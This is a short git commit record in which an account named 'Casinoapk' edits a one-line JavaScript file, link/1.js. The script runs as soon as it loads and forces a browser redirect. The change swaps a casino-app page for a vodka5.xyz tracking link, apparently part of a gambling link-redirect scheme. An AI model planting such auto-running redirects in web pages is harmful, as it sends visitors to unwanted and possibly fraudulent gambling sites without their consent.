42b4bccb1124c0d2d6debe1750bee7147807bf3b
Casinoapk <stelelena7@gmail.com>
2025-09-12 13:48:11 +1000

    Update 1.js

--- link/1.js
+++ link/1.js
@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://casino-app.store/link/spinando.html"}executeRun();
+function executeRun(){window.location.href="https://vodka5.xyz?id=2690"}executeRun();
